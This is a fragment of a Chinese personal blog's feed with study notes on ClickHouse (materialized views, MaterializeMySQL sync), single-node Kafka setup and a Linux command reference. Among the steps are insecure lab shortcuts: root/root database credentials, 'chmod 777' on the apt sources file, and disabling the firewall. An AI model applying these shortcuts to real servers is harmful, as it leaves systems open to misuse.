title="3、应用场景"></a>3、应用场景</h3><ul><li>历史状态可用的业务，比如上面说的sum等聚合。但是对于历史状态不可用的聚合，比如中位数、方差等，无法通过简单使用物化视图或预聚合来实现。</li><li>数据过滤</li><li>当作触发器来用</li><li>流数据处理</li><li><font color="Red">重排序。</font>即基础数据表只能有一个排序字段，但是如果某个业务想要以其他字段排序或group查询效率很低，则可以新建一个以其他字段为order by的物化视图，再将基础数据表的指定数据插入到物化视图中。这种玩法本质是为了做两张表。且一张表是另外一个张表的子集，则可以通过一个sql往两张表写入数据。</li></ul><h2 id="十三、MaterializeMySQL引擎"><a href="#十三、MaterializeMySQL引擎" class="headerlink" title="十三、MaterializeMySQL引擎"></a>十三、MaterializeMySQL引擎</h2><p>MaterializeMySQL引擎是一个<strong>库引擎</strong>，作用是直接将MySQL的数据变化通过流的形式同步到clickhouse中，底层原理和flinkcdc、canal一样都是基于binlog实现的。</p><p>MySQL配置：</p><pre><code class="shell">default-authentication-plugin=mysql_native_password # 需要用这种密码验证方式# 如果配置了主从，则要加上以下配置gtid-mode=on # 主从切换时保证数据一致性enforce-gtid-consistency=1 # 强一致性log-slave-updates=1 # 从服务器日志记录</code></pre><p>clickhouse配置：</p><pre><code class="sql">set allow_experimental_database_materialize_mysql=1; -- 当前版本这个配置是关闭的</code></pre><p>创建对应的数据库：</p><pre><code class="sql">-- MySQL中创建新数据库和表create database testck;create table testck.test1(    seq bigint auto_increment primary key)default charset=utf8mb4;-- clickhouse创建以下数据库create database testck engine=MaterializeMySQL(&#39;192.168.141.141:3306&#39;, &#39;testck&#39;, &#39;root&#39;, &#39;root&#39;);</code></pre><p>注意，通过MaterializeMySQL同步的数据库表必须要有主键，不然会报错。</p><p>如果你的的密码认证插件是从<code>caching_sha2_password</code>临时修改成<code>mysql_native_password</code>的话，你还<font color="Red">需要修改mysql.user表中的<code>plugin</code>字段修改为<code>mysql_native_password</code></font>。不然查询clickhouse的数据时会报错：</p><pre><code class="shell">Code: 100. DB::Exception: Received from myubuntu1:9003. DB::Exception: Access denied for user root.</code></pre><p>同步后，会自动生成对应的clickhouse表，如下。</p><p>MySQL的主键 = clickhouse的order by，并且自动加上了<code>_sign</code>和<code>_version</code>字段。</p><p><code>_sign</code>字段：数据是否有效的标识，1代表有效数据，-1代表无效数据，即被删除了的数据。</p><p><code>_version</code>字段：数据版本号，每次执行MySQL的sql语句，转换为clickhouse的一条sql语句插入的数据版本号都是相同的。clickhouse内部应该维护了一个最大版本号，最新sql语句写入的数据会使用这个最大版本号，使用完之后再让这个最大版本号+1。</p><pre><code class="sql">┌─statement──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐│ CREATE TABLE testck.test1(    `seq` Int64,    `_sign` Int8 MATERIALIZED 1,    `_version` UInt64 MATERIALIZED 1,    INDEX _version _version TYPE minmax GRANULARITY 1)ENGINE = ReplacingMergeTree(_version)PARTITION BY intDiv(seq, 18446744073709551)ORDER BY tuple(seq)SETTINGS index_granularity = 8192 │└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘</code></pre><p>MySQL的增删改操作都会通过一定的方式转换为clickhouse的insert操作。</p><ul><li>MySQL insert = clickhouse的<code>insert with _sign = 1</code>的语句。</li><li>MySQL update = clickhouse的<code>insert with _sign = -1</code>和<code>insert with _sign = 1</code>的两条语句。</li><li>MySQL delete = clickhouse的<code>insert with _sign = -1</code>的语句。</li></ul><h2 id="十四、常见问题"><a href="#十四、常见问题" class="headerlink" title="十四、常见问题"></a>十四、常见问题</h2><p><a href="https://help.aliyun.com/document_detail/162815.html">常见问题排查 (aliyun.com)</a></p><h2 id="十五、监控和备份"><a href="#十五、监控和备份" class="headerlink" title="十五、监控和备份"></a>十五、监控和备份</h2><h3 id="1、监控"><a href="#1、监控" class="headerlink" title="1、监控"></a>1、监控</h3><p>Promethseus + Grafana</p><p>Promethseus：<a href="http://promethseus.io/download">promethseus.io</a></p><p>Grafana：<a href="https://grafana.com/Grafana/download">Download Grafana | Grafana Labs</a></p><h3 id="2、备份"><a href="#2、备份" class="headerlink" title="2、备份"></a>2、备份</h3><p>手动：</p><pre><code class="sql">-- 备份到freeze目录下ALTER TABLE table_name FREEZE [PARTITION partition_expr] [WITH NAME &#39;backup_name&#39;]-- 从detach目录下恢复ALTER TABLE table_name ATTACH PARTITION|PART partition_expr</code></pre><p>自动：</p><p><a href="https://github.com/AlexAkulov/clickhouse-backup">GitHub - AlexAkulov/clickhouse-backup: Tool for easy ClickHouse backup and restore with cloud storages support</a>（小心使用，可能有版本兼容问题。）</p><h2 id="N、一些不同寻常的点（坑）"><a href="#N、一些不同寻常的点（坑）" class="headerlink" title="N、一些不同寻常的点（坑）"></a>N、一些不同寻常的点（坑）</h2><p>（1）普通类型的默认值不为null，都有各自的默认值，具体见Nullable类型说明。</p><p>（2）clickhouse的primary key是可以重复的，有需要的话得手动将其设置为unique。</p><p>（3）ReplacingMergeTree的聚合并不是实时的，每次查询都需要手动聚合去重。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;clickhouse版本：21.7.3.14&lt;/p&gt;
&lt;h2 id=&quot;一、介绍&quot;&gt;&lt;a href=&quot;#一、介绍&quot; class=&quot;headerlink&quot; title=&quot;一、介绍&quot;&gt;&lt;/a&gt;一、介绍&lt;/h2&gt;&lt;h3 id=&quot;1、简介&quot;&gt;&lt;a href=&quot;#1、简介&quot; class</summary>
      
    
    
    
    <category term="bigdata" scheme="https://yury757.github.io/categories/bigdata/"/>
    
    
  </entry>
  
  <entry>
    <title>kafka</title>
    <link href="https://yury757.github.io/bigdata/kafka/kafka"/>
    <id>https://yury757.github.io/bigdata/kafka/kafka</id>
    <published>2021-11-02T16:00:00.000Z</published>
    <updated>2021-11-07T05:20:47.412Z</updated>
    
    <content type="html"><![CDATA[<p>kafka版本：2.12_2.8.1（2.12为scale版本，2.8.1为kafka版本，3.0以上的版本不需要依赖zookeeper）</p><p>zookeeper版本：3.6.3</p><h2 id="单机部署使用"><a href="#单机部署使用" class="headerlink" title="单机部署使用"></a>单机部署使用</h2><pre><code class="shell"># 下载wget https://mirrors.tuna.tsinghua.edu.cn/apache/kafka/2.8.1/kafka_2.12-2.8.1.tgz# 解压tar -xvzf kafka_2.12-2.8.1.tgz# 设置环境变量 sudo vi /etc/profileexport KAFKA_HOME=/home/yury/kafka_2.12-2.8.1export PATH=$&#123;PATH&#125;:$&#123;KAFKA_HOME&#125;/binsource /etc/profile# 以 /kafka_2.12-2.8.1 为根目录# 修改配置 vi server.properties 取下以下配置的注释，并修改称以下值zookeeper.connect=192.168.141.141:2181log.dirs=$&#123;KAFKA_HOME&#125;/tmp/kafka-logslisteners=PLAINTEXT://192.168.141.141:9092# 启动zookeeperskServer.sh startskServer.sh status # 查看状态：Mode: standalone# 写一个快速启动命令放到bin目录下 vi bin/start-kafka.sh 并写入$&#123;KAFKA_HOME&#125;/bin/kafka-server-start.sh $&#123;KAFKA_HOME&#125;/config/server.properties --daemon# 启动kafkastart-kafka.sh# jps命令3010 Jps2578 Kafka2046 QuorumPeerMain</code></pre><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><pre><code class="shell"># 新增topicbin/kafka-topics.sh --bootstrap-server 192.168.141.141:9092 --create --topic test_topic# 查看topicbin/kafka-topics.sh  --bootstrap-server 192.168.141.141:9092 --describe --topic test_topic# 删除topicbin/kafka-topics.sh --bootstrap-server 192.168.141.141:9092 --delete --topic test_topic# 生产数据bin/kafka-console-producer.sh --bootstrap-server 192.168.141.141:9092 --topic test_topic# 消费数据bin/kafka-console-consumer.sh --bootstrap-server 192.168.141.141:9092 --topic test_topic --from-beginning</code></pre><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="1、broker"><a href="#1、broker" class="headerlink" title="1、broker"></a>1、broker</h3><p>一个broker即为一个kafka服务器。</p><h3 id="2、partition分区"><a href="#2、partition分区" class="headerlink" title="2、partition分区"></a>2、partition分区</h3><p>分区，即一个topic会分为多个区域存储数据。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;kafka版本：2.12_2.8.1（2.12为scale版本，2.8.1为kafka版本，3.0以上的版本不需要依赖zookeeper）&lt;/p&gt;
&lt;p&gt;zookeeper版本：3.6.3&lt;/p&gt;
&lt;h2 id=&quot;单机部署使用&quot;&gt;&lt;a href=&quot;#单机部署使用&quot; clas</summary>
      
    
    
    
    <category term="kafka" scheme="https://yury757.github.io/categories/kafka/"/>
    
    <category term="bigdata" scheme="https://yury757.github.io/categories/kafka/bigdata/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux命令</title>
    <link href="https://yury757.github.io/linux/linux%E5%91%BD%E4%BB%A4"/>
    <id>https://yury757.github.io/linux/linux%E5%91%BD%E4%BB%A4</id>
    <published>2021-10-31T16:00:00.000Z</published>
    <updated>2022-04-04T18:48:32.464Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>1、刚安装好后的root用户的密码是随机的，需要修改密码：</p><pre><code class="shell">sudo passwd[sudo] paasword for yury: # 然后输入当前用户yury的密码New password: # 输入root用户的新密码Retype new password: # 重新输入</code></pre><p>2、修改主机名（如需要的话）</p><pre><code class="shell">sudo vi /etc/hostname</code></pre><p>3、用户相关</p><pre><code class="shell"># 切换到root用户su# 新增一个名为XXX的用户useradd XXX# 为XXX用户设置密码passwd XXX# 退出root用户exit# 删除用户xxxsudo deluser xxx# 删除用户xxx及其home里面的文件夹sudo deluser --remove-home xxx# 修改用户名的流程很复杂，且容易使系统奔溃，因此在不是精通linux的情况下最好别修改用户名</code></pre><p>4、关机重启</p><pre><code class="shell"># 重启reboot# 关机poweroff# 关闭系统，不关闭电源halt# 或者使用shutdown --[reboot | halt | poweroff] [now | 20:35 | 10]# now是指立即操作，20:35是指在这个时间点操作，10是指10分钟后操作# 取消定时关机shutdown -c</code></pre><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>1、sudo表示用管理员模式执行</p><p>2、命令后面若带有参数，一般短参数前加“-”，长参数前加“–”，但有些例外，看语言风格。</p><p>3、apt软件包默认下载路径为：/var/cache/apt/archives。apt软件包默认安装路径为：/usr/share</p><p>4、常用命令：</p><ul><li>clear</li><li>sudo：允许本用户以其他用户（默认为超级管理员用户）的安全权限来运行某个命令或程序，即superuser do</li></ul><h2 id="shell语法"><a href="#shell语法" class="headerlink" title="shell语法"></a>shell语法</h2><p>1、读取文本文件，循环每一行数据，将数据作为参数执行命令</p><pre><code class="shell"># 方法1for a in `cat hello.txt`; do echo &quot;$&#123;a&#125; 123&quot;; done;# 方法2while read a; do echo &quot;$&#123;a&#125; 123&quot;; done &lt; hello.txt;while read user_id; do echo &quot;$&#123;user_id&#125;&quot;; clickhouse-client -m -h 192.168.141.141 --port 9003 --query &quot;insert into test_score_mv select user_id, subject, argMax(score, create_time) as score, argMax(isvalid, create_time) as isvalid, max(create_time) as ctime from test_score where user_id = $&#123;user_id&#125; and create_time &lt;= &#39;2021-12-11 15:01:00&#39; group by user_id, subject&quot;; done &lt; test_score.csv;</code></pre><h2 id="系统相关信息"><a href="#系统相关信息" class="headerlink" title="系统相关信息"></a>系统相关信息</h2><pre><code class="shell"># cpu和内存使用情况top# 查看内存free# 查看系统时区timedatectl status# 设置系统时区timedatectl set-timezone &quot;Asia/Shanghai&quot;# 查看linux内核版本cat /proc/versionuname -a# 查看linux系统版本lsb_release -acat /etc/issue</code></pre><h2 id="apt相关"><a href="#apt相关" class="headerlink" title="apt相关"></a>apt相关</h2><p>apt search XXX：搜索软件包</p><p>apt show XXX：显示软件包详情</p><p>apt install XXX：安装某个软件</p><p>apt depends XXX：查询该包使用的依赖包</p><p>apt rdepends XXX：查看该包被哪些包依赖</p><p>apt remove XXX：卸载某个软件（保留配置文件）</p><p>apt –purge remove XXX：卸载某个软件（删除配置文件）</p><p>apt autoremove XXX：自动清理不再使用的依赖和库文件</p><p>apt list –upgradeable：显示可升级的软件包</p><p>apt list –installed：显示已安装的软件包</p><p>apt update：<font color="Red">更新apt仓库包索引</font></p><p>apt upgrade：<font color="Red">更新已安装的软件到最新版本</font></p><p>apt dist-upgrade：升级系统到最新版本</p><h2 id="软件源镜像"><a href="#软件源镜像" class="headerlink" title="软件源镜像"></a>软件源镜像</h2><pre><code class="shell"># 备份软件源配置sudo cp -v /etc/apt/sources.list /etc/apt/sources.list.backup# 修改权限使得这个文件可以编辑sudo chmod 777 /etc/apt/sources.list# 修改sources.list文件，可以把里面的内容删光，重新写入以下内容即可deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb http://archive.ubuntu.com/ubuntu/ focal-security main restricted universe multiversedeb http://archive.ubuntu.com/ubuntu/ focal-updates main restricted universe multiversedeb http://archive.ubuntu.com/ubuntu/ focal-proposed main restricted universe multiverse</code></pre><p>注意不同的ubuntu版本，sources.list里面的内容不一样，如ubuntu 20是focal，18和16又是另外的。</p><p>最后更新一下软件源仓库即可：</p><pre><code class="shell">sudo apt update</code></pre><blockquote><p>安装openssh-server</p></blockquote><pre><code class="shell">sudo apt install openssh-server</code></pre><p>安装了这个后就可以通过其他主机使用ssh命令远程连接这个服务器。</p><h2 id="用户、主机相关"><a href="#用户、主机相关" class="headerlink" title="用户、主机相关"></a>用户、主机相关</h2><h2 id="恢复模式"><a href="#恢复模式" class="headerlink" title="恢复模式"></a>恢复模式</h2><p>重启服务器，进入系统的时候按住shift，即可进入一个选项界面，依次选择：</p><ol><li><p>Unbuntu高级选项</p></li><li><p>recovery mode</p></li></ol><p>进入恢复菜单后，可以根据需要选择。</p><blockquote><p> 修改root用户密码</p></blockquote><p>先选择<code>grub</code>，进入之后按enter，然后回到这个界面，再选择<code>root</code>，进入root的shell命令行后，使用<code>passwd root</code>命令即可修改root用户的密码。</p><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>Ubuntu 17.10及以后的版本使用Netplan（<code>/etc/netplan</code>）作为网络管理工具。以前的版本使用ifconfig和<code>/etc/network/interfaces</code>这个配置文件配置网络。以下对Netplan进行配置。</p><pre><code class="shell"># 进入到配置文件夹cd /etc/netplan# 进入后可能有一个或多个yaml文件，文件名视系统版本不定，我这里只有一个文件，因此直接配置这一个文件即可，如下</code></pre><pre><code class="yaml"># this is the network written by &#39;subiquity&#39;network:  ethernets:    ens33:      addresses:        - 192.168.141.142/24      gateway4: 192.168.141.1      nameservers:        addresses: [223.5.5.5, 223.6.6.6] # 阿里域名服务器        search: []  version: 2</code></pre><blockquote><p>属性解释</p></blockquote><ul><li>version：版本</li><li>renderer：设备类型（如networkd），以上我这里没有出现</li><li>ethernets：配置网络，在我这里只有一个网络<code>ens33</code>，这是默认的网络。每个网络可以设置以下属性：<ul><li>dhcp4：使用dhcp服务器自动分配ip和dns，可以填<code>yes</code>或<code>no</code>，使用dhcp服务器后这里再设置ip好像就没用了，没试过</li><li>addresses：静态局域网地址，可以配置多个</li><li>gateway4：默认网关</li><li>nameservers：域名服务器，可以在这个属性下面的addresses属性里面设置多个域名服务器。search属性shows your search domains，不是很明白，可以不用设置。</li></ul></li></ul><p>保存后，应用修改。</p><pre><code class="shell">sudo netplan apply</code></pre><h2 id="环境变量相关"><a href="#环境变量相关" class="headerlink" title="环境变量相关"></a>环境变量相关</h2><pre><code class="shell"># 列出所有已设置的环境变量env# 引用变量名为XXX的变量值，最好加上大括号，好习惯$&#123;XXX&#125;# 查看变量XXX的值echo $&#123;XXX&#125;# 设置环境变量，在相应的profile文件中添加环境变量# 1、设置用户环境变量，在对应的用户文件夹下的profilevi /home/yury/.profile# 在最下面增加以下代码，设置一个变量名为AAA1的环境变量，其值为BBB1export AAA1=BBB1# 2、设置系统环境变量，在/etc/profile下vi /etc/profileexport AAA2=BBB2# 在环境变量中使用引用，将这个路径添加到PATH环境变量末尾export PATH=$&#123;PATH&#125;:$&#123;JAVA_HOME&#125;/bin# 最后，重新加载用户或系统环境变量，即不需要重启就可以使环境变量生效source /home/yury/.profilesource /etc/profile</code></pre><h2 id="文件与目录相关"><a href="#文件与目录相关" class="headerlink" title="文件与目录相关"></a>文件与目录相关</h2><p>cd /：跳转到根目录</p><p>cd /XXX：跳转到/XXX目录，父目录为root，而不是当前目录</p><p>cd XXX：跳转到当前目录下的XXX目录中</p><p>cd <del>：跳转到</del>目录，~为/home/AAA，AAA为你的用户名</p><p>ls：列出该目录下的所有文件夹和文件</p><p>touch AAA.TXT：创建AAA.TXT文件</p><p>mkdir AAA：在当前目录下继续创建/AAA目录，创建目录时不能写成/AAA，而可以写成AAA/；且只能创建一层目录，不能mkdir AAA/BBB这样创建多层目录</p><p>rm AAA.TXT：删除AAA.TXT文件</p><p>rmdir AAA：删除AAA文件夹</p><p>rm -rf AAA：强制删除AAA文件夹</p><h2 id="java相关（版本jdk8）"><a href="#java相关（版本jdk8）" class="headerlink" title="java相关（版本jdk8）"></a>java相关（版本jdk8）</h2><p>使用apt安装java后安装路径：/usr/lib/jvm/java-8-openjdk-amd64（8为你的java版本，该文件夹名根据你安装的java包名来定）。注：把java安装文件放到/usr/local下面并设置好环境变量，则所有用户都可以使用这个java环境。</p><pre><code class="shell"># 配置JAVA_HOME环境变量export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64# 配置PATH环境变量export PATH=$PATH:$JAVA_HOME/bin# 使环境变量马上生效，不需要重启source ~/.bashrc# 切换java版本update-alternatives --config java</code></pre><h2 id="下载、解压"><a href="#下载、解压" class="headerlink" title="下载、解压"></a>下载、解压</h2><pre><code class="shell"># curl和wget都可以下载，可这样简单区分使用：curl用于较复杂的不仅仅是下载的web场景，而wget适用于快速且不用担心其他参数的下载curl https://github.com/ziyaddin/xampp/archive/master.zip -L -o MyFilename.zipwget https://github.com/ziyaddin/xampp/archive/master.zip# 解压tar xzvf xxxxxxxxx.tar.gz</code></pre><h2 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h2><pre><code class="shell"># 查看所有服务systemctl statuc# 查看某个服务的状态systemctl status mysql.service# 禁止开机启动d# 停止已启动的服务sudo systemctl stop mysql.service# 启动服务systemctl start mysql.service# 关闭防火墙systemctl stop firewalld.service</code></pre><h2 id="磁盘相关"><a href="#磁盘相关" class="headerlink" title="磁盘相关"></a>磁盘相关</h2><pre><code class="shell"># 查看磁盘情况df -hT# 进入磁盘分区情况fdisk -lDisk /dev/fd0: 1.4 MiB, 1474560 bytes, 2880 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0x90909090Device     Boot      Start        End    Sectors  Size Id Type/dev/fd0p1      2425393296 4850786591 2425393296  1.1T 90 unknown/dev/fd0p2      2425393296 4850786591 2425393296  1.1T 90 unknown/dev/fd0p3      2425393296 4850786591 2425393296  1.1T 90 unknown/dev/fd0p4      2425393296 4850786591 2425393296  1.1T 90 unknownDisk /dev/sda: 60 GiB, 64424509440 bytes, 125829120 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: gptDisk identifier: A006A120-A37D-4375-8C47-BF69799EA710Device        Start       End  Sectors Size Type/dev/sda1      2048      4095     2048   1M BIOS boot/dev/sda2      4096   2101247  2097152   1G Linux filesystem/dev/sda3   2101248  41940991 39839744  19G Linux filesystem/dev/sda4  41940992 125829086 83888095  40G Linux filesystemDisk /dev/mapper/ubuntu--vg-ubuntu--lv: 19 GiB, 20396900352 bytes, 39837696 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytes# 对某个分区进行管理fdisk /dev/sda4</code></pre><h3 id="1、磁盘管理下的常用命令"><a href="#1、磁盘管理下的常用命令" class="headerlink" title="1、磁盘管理下的常用命令"></a>1、磁盘管理下的常用命令</h3><pre><code class="shell">m # 显示帮助页面p # 查看分区列表d # 删除分区n # 新建分区q # 不保存直接退出w # 保存并退出</code></pre><h3 id="2、磁盘基本知识"><a href="#2、磁盘基本知识" class="headerlink" title="2、磁盘基本知识"></a>2、磁盘基本知识</h3><p><img src="/images/%E7%A3%81%E7%9B%98%E7%BB%93%E6%9E%84.png"></p><p>platter：盘片，即图中一个个的盘，一个盘片有上下两个盘面</p><p>head：磁头，即图中在盘片上滑动的磁头，一个盘片有上下两个盘面，因此对应两个磁头</p><p>sector：扇区，相当于图中的一条一条的弧，<font color="Red">是磁盘存取的基本单位</font>，1个sector可以是512个byte或4096个byte。</p><p>track：磁道，相当于图中的一个圆</p><p>cylinder：磁柱，相当于图中的一个圆柱形（不同盘片同一磁道组成的圆柱形），磁柱数等于一个盘面上的磁道数。</p><p>block：数据块，<font color="Red">是文件系统存取的最小单位</font>，在Windows下如NTFS等文件系统中叫做簇；在Linux下如Ext4等文件系统中叫做块（block）。每个簇或者块可以包括2、4、8、16、32、64…2的n次方个扇区。</p><p>一个block最多仅能容纳一个文件（即不存在多个文件同一个block的情况）。如果一个文件比block小，他也会占用一个block，因而block中空余的空间会浪费掉。而一个大文件，可以占多个甚至数十个成百上千万的block。</p><p><font color="Red">磁盘容量 = 磁头数 * 磁柱（磁道）数 * 每个磁道的扇区数 * 每个扇区的字节数</font></p><h3 id="3、新建分区流程"><a href="#3、新建分区流程" class="headerlink" title="3、新建分区流程"></a>3、新建分区流程</h3><p>本流程适用于vmware station对服务器进行扩容。</p><ul><li>关闭服务器，在vmware station上的服务器设置中，将硬盘扩展到你需要的大小。</li><li>重新进入服务器，<code>fdisk -l</code>命令查看分区列表，找到磁盘<code>/dev/sda</code>，<code>fdisk /dev/sda</code>命令对该磁盘设备进行管理。</li><li>键入<code>n</code>命令新建分区，后面如果提示选择extended或者primary partition，则选择primary partition。</li><li>然后提示输入分区编号，一般使用提示的默认编号，或者直接回车。</li><li>然后提示输入First cylinder（或sector），即新建的分区的起始cylinder（或sector）编号为多少，一般使用默认（最小）即可。</li><li>最后提示输入Last cylinder（或sector），即新建的分区的截止cylinder（或sector）编号为多少，一般使用默认（最大）即可。</li><li>以上三步有需要可以按自己的需求来选择</li><li>键入<code>w</code>命令保存设置</li><li><code>fdisk -l</code>，查看新分区是否生成：</li><li><code>mkfs.ext4 /dev/sda4</code>，命令格式化（格式化会清除数据）分区，sda4为你之前输入的新分区编号，ext4为文件系统类型</li><li><code>mkdir disk4</code>，在根目录下创建一个空文件夹，<code>mount /dev/sda4 /disk4</code>，将新分区挂载到新建的文件夹下</li><li><code>echo &#39;/dev/sda4 /disk4 ext4 defaults 0 0&#39; &gt;&gt; /etc/fstab</code>，将这个挂载动作写入一个文件中，保证每次启动服务器时会自动将这个分区挂载到这个disk4目录。</li><li><code>reboot</code>，重启服务器，<code>df -hT</code>，查看磁盘情况</li></ul><h3 id="4、分区扩容流程"><a href="#4、分区扩容流程" class="headerlink" title="4、分区扩容流程"></a>4、分区扩容流程</h3><p>不建议在Linux系统盘所在分区进行扩容，小心丢失数据。且必须有未分区的磁盘用于扩容。</p><ul><li><code>df –hT</code>和<code>fdisk -l</code>命令查看磁盘情况和分区情况</li><li><code>umount /dev/sda4</code>，卸载需要扩容的磁盘挂载的分区</li><li><code>fdisk /dev/sda4</code>，对需要扩容的磁盘分区进行管理</li><li><code>d</code>，删除分区</li><li><code>n</code>，新建分区，然后按新建分区的流程设置分区大小</li><li><code>w</code>，保存设置</li><li><code>e2fsck -f /dev/sda4</code>，检查扩容的分区是否ok</li><li><code>resize2fs /dev/sda4</code>，扩容</li><li><code>mount /dev/sda4 /disk4</code>，挂载</li><li><code>df -hT</code>和<code>reboot</code>，查看磁盘情况并重启服务器</li></ul><h2 id="service、systemctl相关"><a href="#service、systemctl相关" class="headerlink" title="service、systemctl相关"></a>service、systemctl相关</h2><p>首先我们得搞清楚你的linux服务器的system manager是谁。一般有<code>SysVinit system manager</code>和<code>Systemd system manage</code>这两种。</p><pre><code class="shell">pstree | head -n 5 # 运行这个命令，若输出`systemd`则说明是第二种，若输出`init`则说明是第一种。</code></pre><h3 id="1、systemd系统"><a href="#1、systemd系统" class="headerlink" title="1、systemd系统"></a>1、systemd系统</h3><h4 id="（1）列举所有service"><a href="#（1）列举所有service" class="headerlink" title="（1）列举所有service"></a>（1）列举所有service</h4><pre><code class="shell">systemctl list-units --type=service # 查看所有正在运行、或者失败了的units servicesystemctl list-units --type=service --all # 查看所有untis servicesystemctl list-unit-files --type=service # 查看已安装了的所有service</code></pre><p>list-units和list-unit-files的区别，linux中man命令对他们的解释如下：</p><blockquote><p>list-units：</p><p>List units that systemd <strong>currently has in memory</strong>. This includes units that are either referenced directly or through a dependency, units that are pinned by applications programmatically, or units that were active in the past and have failed. By default only units which are active, have pending jobs, or have failed are shown; this can be changed with option –all. If one or more PATTERNs are specified, only units matching one of them are shown. The units that are shown are additionally filtered by –type= and –state= if those options are specified.</p><p>list-unit-files：</p><p>List unit files <strong>installed on the system</strong>, in combination with their enablement state (as reported by is-enabled). If one or more PATTERNs are specified, only unit files whose name matches one of them are shown (patterns matching unit file system paths are not supported).</p></blockquote><p>即一个是当前已经加载在内存中的，要么被直接引用或者依赖或者，被其他应用程序固定了，或者曾经启用过但是失败了。另外一个是系统中安装了的。</p><p>linux系统在查找已安装了的service时，会按照以下路径加载service：</p><pre><code class="shell">System Unit Search Path:/etc/systemd/system.control/*/run/systemd/system.control/*/run/systemd/transient/*/run/systemd/generator.early/*/etc/systemd/system/*/etc/systemd/systemd.attached/*/run/systemd/system/*/run/systemd/systemd.attached/*/run/systemd/generator/*.../lib/systemd/system/*/run/systemd/generator.late/*User Unit Search Path:~/.config/systemd/user.control/*$XDG_RUNTIME_DIR/systemd/user.control/*$XDG_RUNTIME_DIR/systemd/transient/*$XDG_RUNTIME_DIR/systemd/generator.early/*~/.config/systemd/user/*/etc/systemd/user/*$XDG_RUNTIME_DIR/systemd/user/*/run/systemd/user/*$XDG_RUNTIME_DIR/systemd/generator/*~/.local/share/systemd/user/*.../usr/lib/systemd/user/*$XDG_RUNTIME_DIR/systemd/generator.late/*</code></pre><p>service的所有状态包括：active, inactive, activating, deactivating, failed, not-found, dead</p><h4 id="（2）注册service"><a href="#（2）注册service" class="headerlink" title="（2）注册service"></a>（2）注册service</h4><p>注册service即只要在对应的加载路径下放入<code>xxx.service</code>脚本即可，然后启动这个脚本即可。这个路径一般就用<code>/etc/systemd/system/</code>或者<code>/lib/systemd/system/</code>下面，比如MySQL的service脚本就是放在后者路径下。</p><pre><code class="shell">[Unit]Description=Grafana ServerAfter=network-online.target[Service]Type=simple  # 服务类型，如果执行程序是linux的可运行文件，则填入simple；如果执行命令是shell脚本方式，则填入forking。User=yury    # 启动用户Group=yury   # 启用的用户组# Restart=on-failure # 重启策略# RestartSec=30      # 重启时间RuntimeDirectory=/disk4/grafana/grafana-8.4.5/# ExecStart为启动命令ExecStart=/disk4/grafana/grafana-8.4.5/bin/grafana-server --homepath=/disk4/grafana/grafana-8.4.5/[Install]WantedBy=multi-user.target</code></pre><p>然后运行<code>systemctl enable grafana.service</code>就可以设置grafana开启服务器后自动启动。</p><p>再比如zookeeper的.service脚本如下：</p><pre><code class="shell">[Unit]Description=Zookeeper ServerAfter=network-online.target[Service]Type=forkingRuntimeDirectory=/disk4/zookeeper/zookeeper-3.6.3ExecStart=/disk4/zookeeper/zookeeper-3.6.3/bin/zkServer.sh startExecStop=/disk4/zookeeper/zookeeper-3.6.3/bin/zkServer.sh stopExecReload=/disk4/zookeeper/zookeeper-3.6.3/bin/zkServer.sh restart[Install]WantedBy=multi-user.target</code></pre><p>但是这样的话，启动后就是以root用户运行，增加User又无法启动。所以目前暂时没找到以普通用户启动的方法。</p><h3 id="2、SysVinit系统"><a href="#2、SysVinit系统" class="headerlink" title="2、SysVinit系统"></a>2、SysVinit系统</h3><h4 id="（1）列举所有service-1"><a href="#（1）列举所有service-1" class="headerlink" title="（1）列举所有service"></a>（1）列举所有service</h4><pre><code class="shell">service --status-all # </code></pre><p>输出内容左侧的符号意思如下：</p><ul><li><strong>+</strong> : means that the service is <strong>running</strong>;</li><li><strong>–</strong> : means that the service is <strong>not running</strong> at all;</li><li><strong>?</strong> : means that Ubuntu <strong>was not able to tell</strong> if the service is running or not.</li></ul><p>还一种列举所有service的方法是：</p><pre><code class="shell">ls -l /etc/init.d/*</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;1、刚安装好后的root用户的密码是随机的，需要修改密码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;sudo passwd</summary>
      
    
    
    
    <category term="linux" scheme="https://yury757.github.io/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>flink_data_warehouse</title>
    <link href="https://yury757.github.io/project/flink_data_warehouse/flink_data_warehouse"/>
    <id>https://yury757.github.io/project/flink_data_warehouse/flink_data_warehouse</id>
    <published>2021-10-29T16:00:00.000Z</published>
    <updated>2022-01-02T06:45:28.629Z</updated>
    
